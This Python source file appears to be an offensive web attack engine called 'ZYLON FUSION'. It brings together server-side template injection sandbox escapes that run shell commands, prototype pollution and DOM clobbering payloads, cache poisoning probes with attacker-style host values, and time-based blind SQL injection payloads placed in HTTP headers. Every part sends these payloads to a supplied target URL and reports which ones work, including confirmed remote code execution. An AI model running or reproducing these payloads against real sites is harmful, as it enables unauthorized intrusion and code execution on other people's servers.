#!/usr/bin/env python3
"""
ZYLON FUSION - Advanced Web Attack Engine (SSTI + PP + CSP + Cache + Blind SQLi)
Fused from: Tplmap + SSTI-Finder + PP-Finder + PP-Static-Analysis + DOM-Clob-Check
            + CSPBypass + CSPass + Autopoisoner + Blisqy + SqliSniper
Capabilities:
  - SSTI enhanced detection (17+ engines +Tplmap sandbox escapes +SSTI-Finder)
  - Prototype Pollution detection & exploitation
  - DOM Clobbering detection
  - CSP bypass analysis
  - Cache Poisoning detection (Autopoisoner-style)
  - Blind SQLi header-based extraction (Blisqy + SqliSniper)
Termux Compatible | No Root Required | Python 3.13+
"""

import requests
import re
import time
import random
import string
import hashlib
from datetime import datetime
from urllib.parse import quote, urlparse

# ============================================================================
# SSTI ADDITIONAL PAYLOADS (from Tplmap + SSTI-Finder)
# ============================================================================

SSTI_SANDBOX_ESCAPE = {
    "jinja2": [
        "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}",
        "{{''.__class__.__mro__[1].__subclasses__()[XXX].__init__.__globals__['popen']('id').read()}}",
        "{% for x in ().__class__.__bases__[0].__subclasses__() %}{% if 'warning' in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen('id').read()}}{% endif %}{% endfor %}",
        "{{request.__class__.__mro__[1].__subclasses__()[XXX]('id',shell=True,stdout=-1).communicate()[0]}}",
        "{{lipsum.__globals__['os'].popen('id').read()}}",
        "{{cycler.__init__.__globals__.os.popen('id').read()}}",
        "{{namespace.__init__.__globals__.os.popen('id').read()}}",
    ],
    "twig": [
        "{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}",
        "{{['id']|filter('system')}}",
        "{{['id']|filter('exec')}}",
    ],
    "freemarker": [
        '<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}',
        '<#assign value="freemarker.template.utility.Execute"?new()>${value("id")}',
    ],
    "velocity": [
        "#set($x='')#set($rt=$x.class.forName('java.lang.Runtime'))#set($chr=$x.class.forName('java.lang.Character'))#set($str=$x.class.forName('java.lang.String'))#set($ex=$rt.getRuntime().exec('id'))",
    ],
    "mako": [
        "<%import os%>${os.popen('id').read()}",
    ],
    "erb": [
        "<%= `id` %>",
        "<%= system('id') %>",
        "<%= exec('id') %>",
    ],
}

# ============================================================================
# PROTOTYPE POLLUTION PAYLOADS (from PP-Finder + PP-Static-Analysis)
# ============================================================================

PP_PAYLOADS = [
    {"__proto__": {"zylonpp": "test"}},
    {"constructor": {"prototype": {"zylonpp": "test"}}},
    {"__proto__.zylonpp": "test"},
    {"constructor.prototype.zylonpp": "test"},
]

PP_TEST_ENDPOINTS = [
    "/api/config", "/api/settings", "/api/user", "/api/update",
    "/graphql", "/api/v1/config", "/api/v1/settings",
    "/api/v1/user", "/login", "/register", "/profile",
]

PP_DOM_CLOBBER = [
    '<form id=__proto__><input name=zylonpp value=test>',
    '<img id=__proto__ name=zylonpp>',
    '<form id=constructor><input name=prototype>',
    '<a id=__proto__ href="javascript:alert(1)">',
]

# ============================================================================
# CSP BYPASS TECHNIQUES (from CSPBypass + CSPass)
# ============================================================================

CSP_BYPASS_TECHNIQUES = [
    {"technique": "JSONP endpoint", "description": "Use JSONP endpoints to bypass script-src"},
    {"technique": "Base tag injection", "description": "Inject <base> tag to redirect resource loading"},
    {"technique": "Angular unsafe-eval", "description": "Exploit unsafe-eval in Angular CSP"},
    {"technique": "SVG injection", "description": "Use SVG with event handlers if image-src is loose"},
    {"technique": "CSS injection", "description": "Exfiltrate data via CSS if style-src allows"},
    {"technique": "Dangling markup", "description": "Use partial tags to exfiltrate data"},
    {"technique": "Script gadget", "description": "Find whitelisted scripts with exploitable gadgets"},
    {"technique": "nonce reuse", "description": "Reuse CSP nonce from same page"},
    {"technique": "Cloudflare bypass", "description": "Cloudflare-specific CSP bypass via workers"},
    {"technique": "Google Analytics bypass", "description": "Use GA whitelisted domain for XSS"},
]

# ============================================================================
# CACHE POISONING PAYLOADS (from Autopoisoner)
# ============================================================================

CACHE_POISON_HEADERS = [
    "X-Forwarded-Host", "X-Forwarded-Proto", "X-Forwarded-Scheme",
    "X-Host", "X-Original-URL", "X-Rewrite-URL",
    "Forwarded", "X-HTTP-Host-Override", "X-Forwarded-Server",
]

CACHE_POISON_VALUES = [
    "zylon-attacker.com", "evil.zylon.com", "attacker.com",
]

# ============================================================================
# BLIND SQLI HEADER PAYLOADS (from Blisqy + SqliSniper)
# ============================================================================

BLIND_SQLI_HEADERS = [
    "X-Forwarded-For", "User-Agent", "Referer", "Cookie",
    "Accept", "Accept-Language", "X-Original-URL", "X-Custom-Header",
]

BLIND_SQLI_TIME_PAYLOADS = [
    "' OR SLEEP(5)-- -",
    "' OR BENCHMARK(5000000,SHA1('test'))-- -",
    "1' AND SLEEP(5)-- -",
    "1; WAITFOR DELAY '0:0:5'-- -",
    "1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)-- -",
]


class AdvancedWebEngine:
    """Advanced Web Attack Engine - SSTI + PP + CSP + Cache + BlindSQLi"""

    def __init__(self, target_url=None, parameter=None, method="GET",
                 headers=None, cookies=None, timeout=10, proxy=None):
        self.target_url = target_url
        self.parameter = parameter or "q"
        self.method = method.upper()
        self.headers = headers or {}
        self.cookies = cookies or {}
        self.timeout = timeout
        self.session = requests.Session()
        self.session.verify = False
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Linux; Android 13) AppleWebKit/537.36'
        })
        if proxy:
            self.session.proxies = {'http': proxy, 'https': proxy}

    def _inject(self, payload, param=None):
        """Inject payload into parameter"""
        p = param or self.parameter
        sep = "&" if "?" in self.target_url else "?"
        url = f"{self.target_url}{sep}{p}={quote(payload)}"
        try:
            if self.method == "GET":
                return self.session.get(url, timeout=self.timeout)
            else:
                return self.session.post(self.target_url, data={p: payload},
                                        timeout=self.timeout)
        except Exception:
            return None

    # ========================================================================
    # SSTI Enhanced Detection (Tplmap + SSTI-Finder)
    # ========================================================================

    def ssti_sandbox_escape(self):
        """Test SSTI sandbox escape payloads"""
        results = {
            "vulnerable": False,
            "engine": None,
            "rce_achieved": False,
            "successful_payloads": [],
        }

        # First do basic detection
        marker = ''.join(random.choices(string.digits, k=8))
        test_payloads = [
            f"{{{{7*7}}}}",  # Jinja2/Twig
            f"${{{7*7}}}",   # Spring EL / some JS
            f"#{{{{7*7}}}}",  # Thymeleaf
            f"<%= 7*7 %>",   # ERB
            f"${{7*7}}",     # EL
            f"#{{7*7}}",     # Velocity
        ]

        expected = str(7 * 7)  # "49"
        detected_engine = None

        for payload in test_payloads:
            resp = self._inject(payload)
            if resp and expected in resp.text:
                if "{{" in payload and "}}" in payload:
                    detected_engine = "jinja2_or_twig"
                elif "${" in payload:
                    detected_engine = "el_or_spring"
                elif "<%=" in payload:
                    detected_engine = "erb"
                elif "#{" in payload:
                    detected_engine = "velocity"
                break

        if not detected_engine:
            return results

        results["engine"] = detected_engine
        results["vulnerable"] = True

        # Try sandbox escapes
        for engine, payloads in SSTI_SANDBOX_ESCAPE.items():
            if engine in detected_engine or detected_engine == "jinja2_or_twig":
                for payload in payloads:
                    resp = self._inject(payload)
                    if resp:
                        if "uid=" in resp.text or "gid=" in resp.text:
                            results["rce_achieved"] = True
                            results["successful_payloads"].append({
                                "engine": engine,
                                "payload": payload[:100],
                                "output": resp.text[:200],
                            })
                            return results
                        elif "root:" in resp.text or len(resp.text) > 20:
                            results["successful_payloads"].append({
                                "engine": engine,
                                "payload": payload[:100],
                                "response_size": len(resp.text),
                            })

        return results

    # ========================================================================
    # Prototype Pollution Detection
    # ========================================================================

    def detect_prototype_pollution(self):
        """Detect prototype pollution vulnerabilities"""
        results = {
            "vulnerable": False,
            "method": None,
            "endpoints_tested": [],
            "dom_clobbering": False,
        }

        # Test server-side PP via API endpoints
        for endpoint in PP_TEST_ENDPOINTS:
            url = self.target_url.rstrip('/') + endpoint
            for payload in PP_PAYLOADS:
                try:
                    resp = self.session.post(url, json=payload, timeout=self.timeout)
                    if resp:
                        # Check if pollution was accepted
                        # Re-request to check if property persists
                        check_resp = self.session.get(url, timeout=self.timeout)
                        if check_resp and "zylonpp" in check_resp.text.lower():
                            results["vulnerable"] = True
                            results["method"] = "server_side"
                            results["endpoints_tested"].append({
                                "endpoint": endpoint,
                                "payload": str(payload)[:80],
                                "polluted": True,
                            })
                            break
                except Exception:
                    continue

        # Test DOM clobbering via reflected input
        for payload in PP_DOM_CLOBBER:
            resp = self._inject(payload)
            if resp and "__proto__" in resp.text:
                results["dom_clobbering"] = True
                results["vulnerable"] = True
                break

        return results

    # ========================================================================
    # CSP Bypass Analysis
    # ========================================================================

    def analyze_csp(self):
        """Analyze Content Security Policy for bypass opportunities"""
        results = {
            "csp_found": False,
            "csp_header": None,
            "directives": {},
            "bypass_opportunities": [],
        }

        try:
            resp = self.session.get(self.target_url, timeout=self.timeout)
            csp = resp.headers.get("Content-Security-Policy", "")
            if not csp:
                csp = resp.headers.get("Content-Security-Policy-Report-Only", "")

            if csp:
                results["csp_found"] = True
                results["csp_header"] = csp

                # Parse directives
                for directive in csp.split(";"):
                    parts = directive.strip().split()
                    if parts:
                        name = parts[0]
                        values = parts[1:]
                        results["directives"][name] = values

                # Check for bypass opportunities
                script_src = results["directives"].get("script-src", [])
                default_src = results["directives"].get("default-src", [])

                if "*" in script_src or "*" in default_src:
                    results["bypass_opportunities"].append({
                        "technique": "Wildcard source",
                        "description": "script-src or default-src contains wildcard *",
                        "severity": "critical",
                    })

                if "unsafe-eval" in script_src:
                    results["bypass_opportunities"].append({
                        "technique": "unsafe-eval",
                        "description": "eval() and similar functions allowed",
                        "severity": "high",
                    })

                if "unsafe-inline" in script_src:
                    results["bypass_opportunities"].append({
                        "technique": "unsafe-inline",
                        "description": "Inline scripts allowed - XSS can work",
                        "severity": "high",
                    })

                for src in script_src + default_src:
                    if "cdn" in src or "googleapis" in src or "cloudflare" in src:
                        results["bypass_opportunities"].append({
                            "technique": "Trusted CDN bypass",
                            "description": f"CDN source {src} may host exploitable scripts",
                            "severity": "medium",
                        })

                if not script_src and not default_src:
                    results["bypass_opportunities"].append({
                        "technique": "Missing script-src",
                        "description": "No script-src directive - scripts unrestricted",
                        "severity": "critical",
                    })
            else:
                results["bypass_opportunities"].append({
                    "technique": "No CSP header",
                    "description": "No Content-Security-Policy header found",
                    "severity": "critical",
                })
        except Exception:
            pass

        return results

    # ========================================================================
    # Cache Poisoning Detection
    # ========================================================================

    def detect_cache_poisoning(self):
        """Detect web cache poisoning vulnerabilities"""
        results = {
            "vulnerable": False,
            "cache_headers_found": [],
            "poisonable_headers": [],
        }

        # Get baseline response
        try:
            baseline = self.session.get(self.target_url, timeout=self.timeout)
            if not baseline:
                return results
        except Exception:
            return results

        # Check for cache headers
        for header in ['X-Cache', 'X-Cache-Hits', 'Age', 'X-Squid-Error',
                       'X-Varnish', 'X-CDN', 'CF-Cache-Status']:
            if header in baseline.headers:
                results["cache_headers_found"].append(
                    f"{header}: {baseline.headers[header]}")

        # Test unkeyed headers for cache poisoning
        for header in CACHE_POISON_HEADERS:
            for value in CACHE_POISON_VALUES:
                try:
                    h = {'User-Agent': 'Mozilla/5.0'}
                    h[header] = value
                    resp = self.session.get(self.target_url, headers=h,
                                           timeout=self.timeout)
                    if resp:
                        # Compare with baseline
                        if value in resp.text and value not in baseline.text:
                            results["vulnerable"] = True
                            results["poisonable_headers"].append({
                                "header": header,
                                "value": value,
                                "reflected_in_body": True,
                            })
                except Exception:
                    continue

        return results

    # ========================================================================
    # Blind SQLi Header-Based (Blisqy + SqliSniper)
    # ========================================================================

    def blind_sqli_headers(self):
        """Test blind SQLi via HTTP headers"""
        results = {
            "vulnerable": False,
            "vulnerable_headers": [],
            "type": None,
        }

        for header in BLIND_SQLI_HEADERS:
            for payload in BLIND_SQLI_TIME_PAYLOADS[:3]:
                try:
                    h = {'User-Agent': 'Mozilla/5.0'}
                    h[header] = payload
                    start_time = time.time()
                    resp = self.session.get(self.target_url, headers=h,
                                           timeout=15)
                    elapsed = time.time() - start_time

                    if elapsed >= 5:  # SLEEP delay detected
                        results["vulnerable"] = True
                        results["type"] = "time_based"
                        results["vulnerable_headers"].append({
                            "header": header,
                            "payload": payload,
                            "delay": elapsed,
                        })
                        return results
                except requests.exceptions.Timeout:
                    # Timeout may indicate SLEEP worked
                    results["vulnerable"] = True
                    results["type"] = "time_based"
                    results["vulnerable_headers"].append({
                        "header": header,
                        "payload": payload,
                        "delay": "timeout",
                    })
                except Exception:
                    continue

        return results

    # ========================================================================
    # Full Advanced Web Audit
    # ========================================================================

    def full_audit(self):
        """Complete advanced web attack assessment"""
        return {
            "ssti_sandbox": self.ssti_sandbox_escape(),
            "prototype_pollution": self.detect_prototype_pollution(),
            "csp_analysis": self.analyze_csp(),
            "cache_poisoning": self.detect_cache_poisoning(),
            "blind_sqli_headers": self.blind_sqli_headers(),
        }


# ============================================================================
# CONVENIENCE RUNNER FUNCTIONS
# ============================================================================

def run_advanced_web_scan(target, scan_type="ssti", **kwargs):
    """Run advanced web attack scan"""
    engine = AdvancedWebEngine(target_url=target, **kwargs)

    scan_methods = {
        "ssti": engine.ssti_sandbox_escape,
        "prototype_pollution": engine.detect_prototype_pollution,
        "csp": engine.analyze_csp,
        "cache_poison": engine.detect_cache_poisoning,
        "blind_sqli_headers": engine.blind_sqli_headers,
        "full": engine.full_audit,
    }

    if scan_type in scan_methods:
        return scan_methods[scan_type]()
    return {"error": f"Unknown scan type: {scan_type}"}
